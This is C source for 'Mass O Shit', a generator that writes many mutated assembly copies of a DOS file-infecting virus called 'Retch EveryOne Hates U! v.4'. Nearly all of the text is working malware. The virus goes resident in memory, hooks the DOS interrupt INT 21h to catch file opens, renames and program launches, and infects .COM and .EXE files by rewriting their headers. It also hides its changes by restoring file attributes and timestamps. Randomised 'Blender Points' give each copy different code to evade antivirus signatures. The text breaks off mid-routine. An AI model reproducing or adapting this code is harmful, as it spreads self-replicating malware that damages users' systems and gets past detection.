/* Mass O Shit MOS by the Digital Anarchist/DSD featuring
   Retch EveryOne Hates U! v.4 a shity virus for a
   shity person */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

main(int argc, char *argv[])
{
        int  c1, c2, c3, c4, c5, c1old , c2old, c3old, c4old, c5old, lc1,st2,rn1,rn2;
        FILE *virname;
        char ch;
        char *src;
        char src1[1000];
        char s1[12], s2[8];
        randomize();
/* junk values placed in old for 1st run of program */

        c1old=9;
        c2old=9;
        c3old=9;
        c4old=9;
        c5old=9;

        if (argc!=2)    {
                printf ("Hey dummy you forget to give me the # !\n");
                printf ("MOS #\n");
                return 1;
                        }

        printf ("Mass O Shit v.2c by the Digital Anarchist[DSD]\n");
        printf ("Generating a random copys of R.E.H.U\n\n");

        st2 = atoi(argv[1]);

        for (rn2=0; rn2<st2; ) {

        itoa(rn2,src1,10);
        strcpy(s2,".asm");
        strcat(src1,s2);
        printf ("Creating R.E.H.U #%s\n",src1);
        if ((virname=fopen(src1,"a+t")) == NULL ) {
                printf ("NOT! ---- Error \n");
                return 1;
        }
/*  ====== Beginning of Virus Source Code =========================  */

fprintf(virname,";                       Retch EveryOne Hates U! v.4\n");
fprintf(virname,";\n");
fprintf(virname,";      About 1/3 of the code has been put in the blender\n");
fprintf(virname,";      giving us 15,625 variants, the final cut will have\n");
fprintf(virname,";      about 15^5 possible variations + a few other goodies\n");
fprintf(virname,";\n");
fprintf(virname,";\n");
fprintf(virname,"PAGE            64, 132\n");
fprintf(virname,"MOD_SIZE                EQU     (mod_top-start+0fh)/10h                           \n");
fprintf(virname,"ARE_SIZE                EQU     (are_top-start+0fh)/10h                           \n");
fprintf(virname,"STK_SIZE                EQU     (are_top-start+10h)                               \n");
fprintf(virname,"seg_c                   SEGMENT BYTE PUBLIC 'CODE'                                \n");
fprintf(virname,"ASSUME          cs:seg_c , ds:seg_c , ss:seg_s                                    \n");
fprintf(virname,"boot                    PROC    FAR       \n");
fprintf(virname,"start:                \n");
fprintf(virname,"        call    calc  \n");
fprintf(virname,"calc:                \n");
fprintf(virname,"         pop    bp   \n");
fprintf(virname,"         sub    bp, (calc-start)                                                  \n");
fprintf(virname,"         push   bp \n");
fprintf(virname,"         pop    si \n");
fprintf(virname,"                   \n");
fprintf(virname,"                   \n");
fprintf(virname,"        push    ds \n");

  fprintf(virname,";        mov     ah,35h                  ; Blender Point #1 \n");
  fprintf(virname,";        mov     al,21h                  ; Goal mov ah,3521h \n");
          c5old=c5;
          for (;;){
          if (c1!=c1old) break;
          c1=random(6);
          }
        c1=c1+1;
        if (c1==6) c1=0;
        if (c1==0) {
        fprintf(virname,"        mov     ah,35h \n");
        fprintf(virname,"        mov     al,21h \n");
        }
        if (c1==1) {
        fprintf(virname,"        mov     al,21h  \n");
        fprintf(virname,"        mov     ah,35h  \n");
        }
        if (c1==2) {
        fprintf(virname,"        mov     ax,1414h  \n");
        fprintf(virname,"        xor     al,35h  \n");
        fprintf(virname,"        xor     ah,21h  \n");
        }
        if (c1==3) {
        fprintf(virname,"        mov     ax,-13602d  \n");
        fprintf(virname,"        not     ax  \n");
        }
        if (c1==4) {
        fprintf(virname,"        mov     al,20h  \n");
        fprintf(virname,"        inc     al  \n");
        fprintf(virname,"        mov     ah,35h  \n");
        }
        if (c1==5) {
        fprintf(virname,"        mov     al,21h  \n");
        fprintf(virname,"        mov     ah,36h  \n");
        fprintf(virname,"        dec     ah  \n");
        }
fprintf(virname,"        int     21h  \n");
fprintf(virname,"check:        \n");
fprintf(virname,"        cli   \n");
fprintf(virname,"        mov     WORD PTR cs:vec_21h+2[si], es   \n");
fprintf(virname,"        mov     WORD PTR cs:vec_21h  [si], bx   \n");
fprintf(virname,"        mov     ax, ds   \n");
fprintf(virname,"        add     WORD PTR cs:jump  +3[si], ax    \n");
fprintf(virname,"        add     WORD PTR cs:sssave+1[si], ax    \n");
fprintf(virname,"        dec     ax  \n");
fprintf(virname,"checj:                               \n");
fprintf(virname,"        jmp     SHORT first          \n");
fprintf(virname,"next:                                \n");
fprintf(virname,"        cmp     BYTE PTR es:0, 4dh   \n");
fprintf(virname,"        jne     exit                 \n");
fprintf(virname,"        add     ax, es:3             \n");
fprintf(virname,"first:                               \n");
fprintf(virname,"        mov     es, ax               \n");
fprintf(virname,"        inc     ax                   \n");
fprintf(virname,"        cmp     BYTE PTR es:0, 5ah ; Z  \n");
fprintf(virname,"        jne     next                    \n");
fprintf(virname,"        mov     bx, es:3                \n");
fprintf(virname,"        sub     bx, ARE_SIZE            \n");
fprintf(virname,"        jc      exit                    \n");
fprintf(virname,"        mov     es:3, bx                \n");
fprintf(virname,"        sub     WORD PTR es:12h, ARE_SIZE \n");
fprintf(virname,"        add     ax, bx   \n");
fprintf(virname,"        mov     es, ax   \n");
fprintf(virname,"        xor     di, di   \n");
fprintf(virname,"        mov     cx, MOD_SIZE*10h+4  \n");
fprintf(virname,"        cld                         \n");
fprintf(virname,"rloop:                              \n");
fprintf(virname,"        movs   byte ptr es:[di],cs:[si]     \n");
fprintf(virname,"        loop    rloop      \n");
fprintf(virname,"        push    es         \n");
fprintf(virname,"        pop     ds         \n");
fprintf(virname,"        mov     BYTE PTR ds:int_21h, 09ch  \n");
fprintf(virname,"        mov     dx, (int_21h-start) \n");
fprintf(virname,"                                    \n");

fprintf(virname,";        mov     ax, 2532h               ; Blender Point #2 \n");
fprintf(virname,";        xor     ax, 0013h               ; goal mov ax,2521h \n");
        c1old=c1;
        for (;;){
        if (c2!=c2old) break;
        for (rn1=0;rn1<530;rn1++) c2=random(6)   ;
        }
        c2=c2+1;
        if (c2==6) c2=0;
        if (c2==0) {
        fprintf(virname,"        mov     ax,2532h \n");
        fprintf(virname,"        xor     ax,0013h \n");
        }
        if (c2==1) {
        fprintf(virname,"        mov     ax,2532h \n");
        fprintf(virname,"        xor     ax,0012h \n");
        fprintf(virname,"        inc     ax \n");
        }
        if (c2==2) {
        fprintf(virname,"        mov     ax,0013h \n");
        fprintf(virname,"        xor     ax,2532h \n");
        }
        if (c2==3) {
        fprintf(virname,"        mov     ax,0013h \n");
        fprintf(virname,"        inc     ax \n");
        fprintf(virname,"        xor     ax,2532h \n");
        fprintf(virname,"        sub     ax,0005h \n");
        }
        if (c2==4) {
        fprintf(virname,"        mov     ax,0014h \n");
        fprintf(virname,"        xor     ax,2532h \n");
        fprintf(virname,"        sub     ax,0005h \n");
        }
        if (c2==5) {
        fprintf(virname,"        xor     ax,ax \n");
        fprintf(virname,"        mov     ax,0016h \n");
        fprintf(virname,"        xor     ax,2532h \n");
        fprintf(virname,"        sub     ax,0003h \n");
        }
fprintf(virname,"        int     21h                      \n");
fprintf(virname,"exit:                                    \n");
fprintf(virname,"        pop     ds                       \n");
fprintf(virname,"        push    ds                       \n");
fprintf(virname,"        pop     es                       \n");
fprintf(virname,"s_sav1:                                 \n");
fprintf(virname,"        jmp     SHORT sssave             \n");
fprintf(virname,"                 DB      00, 01, 00, 00  \n");
fprintf(virname,"s_sav2:                                  \n");
fprintf(virname,"        mov     WORD PTR ds:102h, 0      \n");
fprintf(virname,"s_savch:                                 \n");
fprintf(virname,"        mov     WORD PTR ds:110h, 0      \n");
fprintf(virname,"        jmp     SHORT out_c              \n");
fprintf(virname,"sssave:                                  \n");
fprintf(virname,"        mov     ax, 0010h                \n");
fprintf(virname,"        mov     ss, ax                   \n");
fprintf(virname,"spsave:                                  \n");
fprintf(virname,"        mov     sp, (are_top-start)      \n");
fprintf(virname,"out_c:                                   \n");
fprintf(virname,"        xor     ax, ax                   \n");
fprintf(virname,"jump:                                    \n");
fprintf(virname,"                        DB      0eah     \n");
fprintf(virname,"                        DW      (ouexit-start), 0010h \n");
fprintf(virname,"boot                    ENDP            ;  \n");
fprintf(virname,"c_200                   DW      200h       \n");
fprintf(virname,"c_10                    DW      10h        \n");
fprintf(virname,"int_24h:                                   \n");
fprintf(virname,"        mov     al, 3  \n");
fprintf(virname,"        iret           \n");
fprintf(virname,"int_21h:               \n");
fprintf(virname,"        pushf          \n");
fprintf(virname,"        push    bp     \n");
fprintf(virname,"        xor     bp, bp \n");
fprintf(virname,"        push    bp          \n");
fprintf(virname,"        popf  ;   \n");
fprintf(virname,"        sub     sp, 2                   ;   \n");
fprintf(virname,"        mov     BYTE PTR cs:ret_i, 2eh  ;   \n");
fprintf(virname,"        pop     bp       \n");
fprintf(virname,"        cmp     bp, 0    \n");
fprintf(virname,"        jne     ex_int   \n");
fprintf(virname,"        cmp     ah, 3dh  \n");
fprintf(virname,"        jne     next_0   \n");
fprintf(virname,"        cmp     al, 1h   \n");
fprintf(virname,"        jne     file_do  \n");
fprintf(virname,"next_0:                  \n");
fprintf(virname,"        cmp     ah, 56h  \n");
fprintf(virname,"        je      file_do  \n");
fprintf(virname,"        xchg    ah,al    \n");
fprintf(virname,"        cmp     al,4bh   \n");
fprintf(virname,"        xchg    ah,al    \n");
fprintf(virname,"        jne     next_1   \n");
fprintf(virname,"file_do:                 \n");
fprintf(virname,"        mov     bp, (exec_fil-call1-3)  ;   \n");
fprintf(virname,"next_1:                                     \n");
fprintf(virname,";        cmp     ax,3521h               ; Blender Point #3 \n");
fprintf(virname,";                                       ; Goal is cmp ax,3521h\n");
        c2old=c2;
        for (;;){
        if (c3!=c3old) break;
        for (rn1=0;rn1<430;rn1++) c3=random(6)   ;
        }
        c3=c3+1;
        if (c3==6) c3=0;
        if (c3==0) {
        fprintf(virname,"        cmp     ax, 3521h  \n");
        }
        if (c3==1) {
        fprintf(virname,"        inc     ax  \n");
        fprintf(virname,"        xor     ax, 0013h \n");
        fprintf(virname,"        dec     ax  \n");
        fprintf(virname,"        xor     ax, 0013h \n");
        fprintf(virname,"        sub     ax, 0002h \n");
        fprintf(virname,"        cmp     ax, 3521h  \n");

/*
   This same line could be used during a run by replacing the xor with run#
   similar to the way we conver run# into the file name in fopen
*/
        }
        if (c3==2) {
        fprintf(virname,"        xor     ax, 0013h \n");
        fprintf(virname,"        dec     ax  \n");
        fprintf(virname,"        xor     ax, 0013h  \n");
        fprintf(virname,"        dec     ax  \n");
        fprintf(virname,"        cmp     ax, 3521h \n");

        }
        if (c3==3) {
        fprintf(virname,"        xor     ax, 0013h \n");
        fprintf(virname,"        add     ax, 0001h \n");
        fprintf(virname,"        dec     ax \n");
        fprintf(virname,"        xor     ax, 0013h  \n");
        fprintf(virname,"        cmp     ax, 3521h \n");
        }
        if (c3==4) {
        fprintf(virname,"        sub     ax,0013h \n");
        fprintf(virname,"        add     ax,0013h \n");
        fprintf(virname,"        cmp     ax,3521h \n");
        }
        if (c3==5) {
        fprintf(virname,"        push    cx \n");
        fprintf(virname,"        mov     cx,0013h \n");
        fprintf(virname,"sigh:                   \n");
        fprintf(virname,"        dec     ax    \n");
        fprintf(virname,"        loop    sigh  \n");
        fprintf(virname,"        add     ax,0013h \n");
        fprintf(virname,"        cmp     ax,3521h \n");

        }
fprintf(virname,"        jne     next_2 \n");
fprintf(virname,"        push    si  \n");
        fprintf(virname,";        mov     si, (ch_inst-call1-3)  ; Blender Point #4       \n");
        fprintf(virname,";        push    si                      \n");
        fprintf(virname,";        pop     bp                      \n");
        fprintf(virname,";        pop     si                      \n");
        c3old=c3;
        for (;;){
        if (c4!=c4old) break;
        for (rn1=0;rn1<333;rn1++) c4=random(6)   ;
        }
        c4=c4+1;
        if (c4==6) c4=0;
        if (c4==0) {
        fprintf(virname,"        mov     si, (ch_inst-call1-3)\n");
        }
        if (c4==1) {
        fprintf(virname,"        mov     si, 0\n");
        fprintf(virname,"        mov     si, (ch_inst-call1-3)\n");
        fprintf(virname,"        dec     si  \n");
        fprintf(virname,"        inc     si  \n");
        }
        if (c4==2) {
        fprintf(virname,"        mov     si, (ch_inst-call1-3)\n");
        fprintf(virname,"        inc     si \n");
        fprintf(virname,"        dec     si \n");
        }
        if (c4==3) {
        fprintf(virname,"        xor     si, si \n");
        fprintf(virname,"        mov     si, (ch_inst-call1-3)\n");
        }
        if (c4==4) {
        fprintf(virname,"        mov     si, (ch_inst-call1-3)\n");
        fprintf(virname,"        sub     si,0013h \n");
        fprintf(virname,"        add     si,0012h \n");
        fprintf(virname,"        xor     si,0001h \n");
        }
        if (c4==5) {
        fprintf(virname,"        push    cx \n");
        fprintf(virname,"        xor     cx,cx \n");
        fprintf(virname,"        mov     si,cx\n");
        fprintf(virname,"        mov     cx, (ch_inst-call1-3) \n");
        fprintf(virname,"loop0:                 \n");
        fprintf(virname,"        inc     si \n");
        fprintf(virname,"        loop    loop0 \n");
        fprintf(virname,"        pop     cx \n");
        }
        fprintf(virname,"        push    si                    \n");
        fprintf(virname,"        pop     bp \n");
        fprintf(virname,"        pop     si \n");
        fprintf(virname,"next_2:            \n");
        fprintf(virname,"        or      bp, bp \n");
        fprintf(virname,"        jz      ex_int \n");
fprintf(virname,"        mov     WORD PTR cs:call1+1, bp \n");
fprintf(virname,"        cmp     bp, (exec_fil-start)    \n");
fprintf(virname,"        ja      ret_2                   \n");
fprintf(virname,"        call    caller                  \n");
fprintf(virname,"ex_int:                                 \n");
fprintf(virname,"        pop     bp                    \n");
fprintf(virname,"        popf                          \n");
fprintf(virname,"ret_i:                                      \n");
fprintf(virname,"        jmp     DWORD PTR cs:vec_21h        \n");
fprintf(virname,"ret_2:                                      \n");
fprintf(virname,"        call    int_21h                     \n");
fprintf(virname,"        push    ax                          \n");
fprintf(virname,"        sahf                                \n");
fprintf(virname,"        mov     sp, bp                      \n");
fprintf(virname,"        mov     ss:[bp+6], ax               \n");
fprintf(virname,"        pop     ax                          \n");
fprintf(virname,"        call    caller                      \n");
fprintf(virname,"        pop     bp                          \n");
fprintf(virname,"        popf                                \n");
fprintf(virname,"        iret                                \n");
fprintf(virname,"caller                  PROC    NEAR        \n");
fprintf(virname,"        mov     cs:sav_ss, ss               \n");
fprintf(virname,"        mov     cs:sav_sp, sp               \n");
fprintf(virname,"        push    cs                          \n");
fprintf(virname,"        pop     ss                          \n");
fprintf(virname,"        mov     sp, OFFSET are_top          \n");
fprintf(virname,"        push    es                          \n");
fprintf(virname,"        push    ds                          \n");
fprintf(virname,"        push    di                          \n");
fprintf(virname,"        push    si                          \n");
fprintf(virname,"        push    ax                          \n");
fprintf(virname,"        push    bx                          \n");
fprintf(virname,"        push    cx                          \n");
fprintf(virname,"        push    dx                          \n");
fprintf(virname,"        mov     bp, sp                      \n");
fprintf(virname,"        mov     BYTE PTR cs:int_21h, 0cfh  \n");
fprintf(virname,"call1:                                   \n");
fprintf(virname,"        call    exec_fil                 \n");
fprintf(virname,"        mov     BYTE PTR cs:int_21h, 09ch \n");
fprintf(virname,"        pop     dx                       \n");
fprintf(virname,"        pop     cx                       \n");
fprintf(virname,"        pop     bx                       \n");
fprintf(virname,"        pop     ax                       \n");
fprintf(virname,"        pop     si                       \n");
fprintf(virname,"        pop     di                       \n");
fprintf(virname,"        pop     ds                       \n");
fprintf(virname,"        pop     es                       \n");
fprintf(virname,"        mov     ss, cs:sav_ss            \n");
fprintf(virname,"        mov     sp, cs:sav_sp            \n");
fprintf(virname,"        retn                             \n");
fprintf(virname,"caller                  ENDP             \n");
fprintf(virname,"ch_inst                 PROC    NEAR     \n");
fprintf(virname,"        les     bx, DWORD PTR cs:sav_sp  \n");
fprintf(virname,"        les     bx, DWORD PTR es:[bx+6]  \n");
fprintf(virname,"ch_nex:                                  \n");
fprintf(virname,"        cmp     es:[bx], 2efah           \n");
fprintf(virname,"        jne     ret_inst                 \n");
fprintf(virname,"        add     BYTE PTR es:[bx+checj-check], (exit-first)  \n");
fprintf(virname,"        mov     BYTE PTR cs:ret_i, 0cfh                     \n");
fprintf(virname,"ret_inst:                                                   \n");
fprintf(virname,"        retn                                                \n");
fprintf(virname,"ch_inst                 ENDP                                                      \n");
fprintf(virname,"exec_fil                PROC    NEAR   \n");
fprintf(virname,"        call    file_o                 \n");
fprintf(virname,"        push    cs                     \n");
fprintf(virname,"        pop     ds                     \n");
fprintf(virname,"        mov     dx, OFFSET header      \n");
fprintf(virname,"        mov     cx, 20h                \n");
fprintf(virname,"        call    read                   \n");
fprintf(virname,"        mov     ax, exesp              \n");
fprintf(virname,"        mov     WORD PTR spsave+1 , ax \n");
fprintf(virname,"        mov     WORD PTR s_savch+4, ax \n");
fprintf(virname,"        sub     ax, exeip              \n");
fprintf(virname,"        cmp     ax, STK_SIZE           \n");
fprintf(virname,"        je      jerr                   \n");
fprintf(virname,"        mov     al, 2                  \n");
fprintf(virname,"        call    int_str                \n");
fprintf(virname,"        cmp     dx, 3h                 \n");
fprintf(virname,"        jge     jerr                   \n");
fprintf(virname,"        push    ax                     \n");
fprintf(virname,"        mov     ax, header             \n");
fprintf(virname,"        jmp     afirst                 \n");
fprintf(virname,"bfirst:                                 ; Blender Point #5 \n");
fprintf(virname,"        cmp     al,4dh                  ;                                         \n");
fprintf(virname,"        je      also                    ; Goal cmp ax,5a4dh                       \n");
fprintf(virname,"afirst:                                 ;                                         \n");
fprintf(virname,"         cmp     ah, 5ah                ;                                         \n");
fprintf(virname,"        je      bfirst                                                            \n");
fprintf(virname,"        cmp     ax, 4d5ah               ;                                         \n");
fprintf(virname,"        je      also                    ;                                         \n");
fprintf(virname,"        mov     WORD PTR s_sav1+4, ax   ;                                         \n");
fprintf(virname,"        mov     WORD PTR s_sav1, 06c7h  ;                                         \n");
fprintf(virname,"        xor     ax, ax                  ;                                         \n");
fprintf(virname,"        mov     WORD PTR jump+3, ax     ;                                         \n");
/* ===================Blender Point #5 ================= */
fprintf(virname,";        push cx                         ; Blender Point #5                                         \n");
fprintf(virname,";        mov     cx,ax                   ; goal mov word ptr jump+1, 100h \n");
fprintf(virname,";        add     cx,0100h                ;                                          \n");
fprintf(virname,";looper:                                 ;                                          \n");
fprintf(virname,";        inc     ax                      ; BLENDER PIONT                           \n");
fprintf(virname,";        mov     word ptr jump+1, ax     ; GOAL mov word ptr jump+1, 100h          \n");
fprintf(virname,";        loop    looper                  ;        or make ax 100h                  \n");
fprintf(virname,";        pop      cx                      ;                                         \n");
        c4old=c4;
        for (;;){
        if (c5!=c5old) break;
        for (rn1=0;rn1<603;rn1++) c5=random(6)   ;
        }
        c5=c5+1;
        if (c5==6) c5=0;
        if (c5==0) {
fprintf(virname,"        push cx                         ; Blender Point #5                                         \n");
fprintf(virname,"        mov     cx,ax                   ; goal mov word ptr jump+1, 100h \n");
fprintf(virname,"        add     cx,0100h                ;                                          \n");
fprintf(virname,"looper:                                 ;                                          \n");
fprintf(virname,"        inc     ax                      ; BLENDER PIONT                           \n");
fprintf(virname,"        mov     word ptr jump+1, ax     ; GOAL mov word ptr jump+1, 100h          \n");
fprintf(virname,"        loop    looper                  ;        or make ax 100h                  \n");
fprintf(virname,"        pop      cx                      ;                                         \n");
                }
        if (c5==1) {
fprintf(virname,"        push cx                         ; Blender Point #5                                         \n");
fprintf(virname,"        xor     cx,cx                   ; goal mov word ptr jump+1, 100h \n");
fprintf(virname,"        add     cx,0100h                ;                                          \n");
fprintf(virname,"looper:                                 ;                                          \n");
fprintf(virname,"        inc     ax                      ; BLENDER PIONT                           \n");
fprintf(virname,"        mov     word ptr jump+1, ax     ; GOAL mov word ptr jump+1, 100h          \n");
fprintf(virname,"        loop    looper                  ;        or make ax 100h                  \n");
fprintf(virname,"        pop      cx                      ;                                         \n");
                }
        if (c5==2) {
fprintf(virname,"        push cx                      \n");
fprintf(virname,"        mov     cx,0000h               \n");
fprintf(virname,"        add     cx,0100h             \n");
fprintf(virname,"looper:                              \n");
fprintf(virname,"        inc     ax                  \n");
fprintf(virname,"        mov     word ptr jump+1, ax \n");
fprintf(virname,"        loop    looper              \n");
fprintf(virname,"        pop      cx                  \n");
                }
        if (c5==3) {
fprintf(virname,"        push cx                      \n");
fprintf(virname,"        mov     cx,0000h             \n");
fprintf(virname,"        add     cx,0100h             \n");
fprintf(virname,"looper:                              \n");
fprintf(virname,"        inc     ax                  \n");
fprintf(virname,"        loop    looper              \n");
fprintf(virname,"        mov     word ptr jump+1, ax \n");
fprintf(virname,"        pop      cx                  \n");
                }
        if (c5==4) {
fprintf(virname,"        push cx                      \n");
fprintf(virname,"        mov     cx,0100h             \n");
fprintf(virname,"looper:                              \n");
fprintf(virname,"        inc     ax                  \n");
fprintf(virname,"        loop    looper              \n");
fprintf(virname,"        mov     word ptr jump+1, ax \n");
fprintf(virname,"        pop      cx                  \n");
                }
        if (c5==5) {
fprintf(virname,"        push cx                      \n");
fprintf(virname,"        mov     cx,0100h             \n");
fprintf(virname,"looper:                              \n");
fprintf(virname,"        inc     ax                  \n");
fprintf(virname,"        mov     word ptr jump+1, ax \n");
fprintf(virname,"        loop    looper              \n");
fprintf(virname,"        pop      cx                  \n");
                }
/*  =============== End Of Blender Point #5  ======================== */

fprintf(virname,"        mov     word ptr jump+1, ax                 \n");
fprintf(virname,"        mov     ax, partpag                         \n");
fprintf(virname,"        mov     WORD PTR s_sav2+4, ax               \n");
fprintf(virname,"        mov     BYTE PTR header, 0e9h               \n");
fprintf(virname,"        pop     ax                                  \n");
fprintf(virname,"        sub     ax, 3h                              \n");
fprintf(virname,"        mov     WORD PTR header+1, ax               \n");
fprintf(virname,"        jmp     SHORT write_f                       \n");
fprintf(virname,"jerr:                                               \n");
fprintf(virname,"        retn                                        \n");
fprintf(virname,"also:                                               \n");
fprintf(virname,"        mov     WORD PTR s_sav1, 12ebh              \n");
fprintf(virname,"        mov     ax, exeip                           \n");
fprintf(virname,"        mov     WORD PTR jump+1, ax                 \n");
fprintf(virname,"        mov     ax, relocs                          \n");
fprintf(virname,"        add     ax, 10h                             \n");
fprintf(virname,"        mov     WORD PTR jump+3, ax                 \n");
fprintf(virname,"        mov     ax, reloss                          \n");
fprintf(virname,"        add     ax, 10h                             \n");
fprintf(virname,"        mov     WORD PTR sssave+1, ax               \n");
fprintf(virname,"        pop     ax                                  \n");
fprintf(virname,"        mov     di, dx                              \n");
fprintf(virname,"        mov     si, ax                              \n");
fprintf(virname,"        add     ax, OFFSET mod_top                  \n");
fprintf(virname,"        adc     dx, 0                               \n");
fprintf(virname,"        div     c_200                               \n");
fprintf(virname,"        inc     ax                                  \n");
fprintf(virname,"        mov     pagecnt, ax                         \n");
fprintf(virname,"        mov     partpag, dx                         \n");
fprintf(virname,"        mov     ax, hdrsize                         \n");
fprintf(virname,"        mul     c_10                                \n");
fprintf(virname,"        xchg    dx, di                              \n");
fprintf(virname,"        xchg    ax, si                              \n");
fprintf(virname,"        sub     ax, si                              \n");
fprintf(virname,"        sbb     dx, di                              \n");
fprintf(virname,"        div     c_10                                \n");
fprintf(virname,"        mov     exeip, dx                           \n");
fprintf(virname,"        mov     relocs, ax                          \n");
fprintf(virname,"        mov     reloss, ax                          \n");
fprintf(virname,"        inc     minmem                              \n");
fprintf(virname,"write_f:                                            \n");
fprintf(virname,"        mov     ax, exeip                           \n");
fprintf(virname,"        add     ax, STK_SIZE                        \n");
fprintf(virname,"        mov     exesp, ax                           \n");
fprintf(virname,"        cwd                                         \n");
fprintf(virname,"        mov     cx, OFFSET mod_top                  \n");
fprintf(virname,"        call    write                               \n");
fprintf(virname,"        xor     al, al                              \n");
fprintf(virname,"        call    int_str                             \n");
fprintf(virname,"        mov     dx, OFFSET header                   \n");
fprintf(virname,"        mov     cx, 20h                             \n");
fprintf(virname,"        call    write                               \n");
fprintf(virname,"        retn                                        \n");
fprintf(virname,"exec_fil                ENDP                        \n");
fprintf(virname,"doit                    PROC    NEAR                \n");
fprintf(virname,"        lodsb                                       \n");
fprintf(virname,"        cmp     al, 'a'                             \n");
fprintf(virname,"        jb      j1                                  \n");
fprintf(virname,"        sub     al, ('a'-'A')                       \n");
fprintf(virname,"j1:                                                 \n");
fprintf(virname,"        cmp     al, ah                              \n");
fprintf(virname,"        retn                                        \n");
fprintf(virname,"doit                    ENDP                        \n");
fprintf(virname,"file_o                  PROC    NEAR                \n");
fprintf(virname,"        pop     bx                                  \n");
fprintf(virname,"        push    ds                                  \n");
fprintf(virname,"        pop     es                                  \n");
fprintf(virname,"        mov     di, dx                              \n");
fprintf(virname,"        mov     al, '.'                             \n");
fprintf(virname,"        mov     ch,01h                              \n");
fprintf(virname,"        mov     cl,00h                              \n");
fprintf(virname,"        repne   scasb                               \n");
fprintf(virname,"        jne     abort                               \n");
fprintf(virname,"        mov     si, di                              \n");
fprintf(virname,"        mov     ah, 'C'                             \n");
fprintf(virname,"        call    doit                                \n");
fprintf(virname,"        jne     n_exe                               \n");
fprintf(virname,"c_2:                                                \n");
fprintf(virname,"        mov     ah, 'O'                             \n");
fprintf(virname,"        call    doit                                \n");
fprintf(virname,"        jne     n_exe                               \n");
fprintf(virname,"c_3:                                                \n");
fprintf(virname,"        mov     ah, 'M'                             \n");
fprintf(virname,"        call    doit                                \n");
fprintf(virname,"        je      contin                              \n");
fprintf(virname,"n_exe:                                              \n");
fprintf(virname,"        mov     si, di                              \n");
fprintf(virname,"        mov     ah, 'E'                             \n");
fprintf(virname,"        call    doit                                \n");
fprintf(virname,"        jne     abort                               \n");
fprintf(virname,"e_2:                                                \n");
fprintf(virname,"        mov     ah, 'X'                             \n");
fprintf(virname,"        call    doit                                \n");
fprintf(virname,"        jne     abort                               \n");
fprintf(virname,"e_3:                                                \n");
fprintf(virname,"        mov     ah, 'E'                             \n");
fprintf(virname,"        call    doit                                \n");
fprintf(virname,"        je      contin                              \n");
fprintf(virname,"abort:                                              \n");
fprintf(virname,"        retn                                        \n");
fprintf(virname,"contin:                                             \n");
fprintf(virname,"        mov     WORD PTR cs:exec_p, bx              \n");
fprintf(virname,"        mov     si, dx                              \n");
fprintf(virname,"        mov     ax, 3300h                           \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        push    dx                                  \n");
fprintf(virname,"        mov     ax, 3301h                           \n");
fprintf(virname,"        push    ax                                  \n");
fprintf(virname,"        xor     dl, dl                              \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        mov     ax, 3524h                           \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        push    es                                  \n");
fprintf(virname,"        push    bx                                  \n");
fprintf(virname,"        push    ds                                  \n");
fprintf(virname,"        push    cs                                  \n");
fprintf(virname,"        pop     ds                                  \n");
fprintf(virname,"        mov     dx, (int_24h-start)                 \n");
fprintf(virname,"        mov     ax, 2524h                           \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        pop     ds                                  \n");
fprintf(virname,"        mov     ah, 54h                             \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        push    ax                                  \n");
fprintf(virname,"        mov     ax, 2e00h                           \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        mov     dx, 1                               \n");
fprintf(virname,"        call    retry                               \n");
fprintf(virname,"        mov     dx, si                              \n");
fprintf(virname,"        push    ds                                  \n");
fprintf(virname,"        push    dx                                  \n");
fprintf(virname,"        mov     ax, 4300h                           \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        push    cx                                  \n");
fprintf(virname,"        test    cl, 1                               \n");
fprintf(virname,"        jz      skip1                               \n");
fprintf(virname,"        mov     ax, 4301h                           \n");
fprintf(virname,"        xor     cx, cx                              \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        jc      skip2                               \n");
fprintf(virname,"skip1:                                              \n");
fprintf(virname,"        mov     ax, 3d02h                           \n");
fprintf(virname,"        call    int_21                              \n");
fprintf(virname,"        jc      skip2                               \n");
fprintf(virname,"        mov     WORD PTR cs:int_han+1, ax         \n");
fprintf(virname,"        mov     ax, 5700h                         \n");
fprintf(virname,"        call    int_han                           \n");
fprintf(virname,"        push    cx                                \n");
fprintf(virname,"        push    dx                                \n");
fprintf(virname,"        call    WORD PTR cs:exec_p                \n");
fprintf(virname,"        pop     dx                                \n");
fprintf(virname,"        pop     cx                                \n");
fprintf(virname,"        mov     ax,0000h                          \n");
fprintf(virname,"        xor     ax,5700h                          \n");
fprintf(virname,"        inc     ax                                \n");
fprintf(virname,"        call    int_han                           \n");
fprintf(virname,"        mov     ah, 3eh                           \n");
fprintf(virname,"        call    int_han                           \n");
fprintf(virname,"skip2:                                            \n");
fprintf(virname,"        pop     cx                                \n");
fprintf(virname,"        pop     dx                                \n");
fprintf(virname,"        pop     ds                                \n");
fprintf(virname,"        xor     ch, ch                            \n");
fprintf(virname,"        test    cl, 1                             \n");
fprintf(virname,"        jz      skip3                             \n");
fprintf(virname,"                                                  \n");
fprintf(virname,"        mov     ax,1400h                          \n");
fprintf(virname,"        xor     ax,5701h                          \n");
fprintf(virname,"                                                  \n");
fprintf(virname,"        call    int_21                            \n");
fprintf(virname,"skip3:                                            \n");
fprintf(virname,"        mov     dx, 3                             \n");
fprintf(virname,"        call    retry                             \n");
fprintf(virname,"        pop     ax                                \n");
fprintf(virname,"        mov     ah, 2eh                           \n");
fprintf(virname,"        call    int_21                            \n");
fprintf(virname,"        pop     dx                                \n");
fprintf(virname,"        pop     ds                                \n");
fprintf(virname,"        mov     ax, 2524h                         \n");
fprintf(virname,"        call    int_21                            \n");
fprintf(virname,"        pop     ax                                \n");
fprintf(virname,"        pop     dx                                \n");
fprintf(virname,"        call    int_21                            \n");
fprintf(virname,"exit_o:                                           \n");
fprintf(virname,"        retn                                      \n");
fprintf(virname,"file_o                  ENDP                      \n");
fprintf(virname,"io                      PROC    NEAR              \n");
fprintf(virname,"read:                                             \n");
fprintf(virname,"        mov     ah, 3fh                           \n");
fprintf(virname,"        jmp     SHORT l_io                        \n");
fprintf(virname,"write:                                            \n");
fprintf(virname,"        mov     ah,40h                            \n");
fprintf(virname,"l_io:                                             \n");
fprintf(virname,"        call    int_han                           \n");
fprintf(virname,"        jc      err_io                            \n");
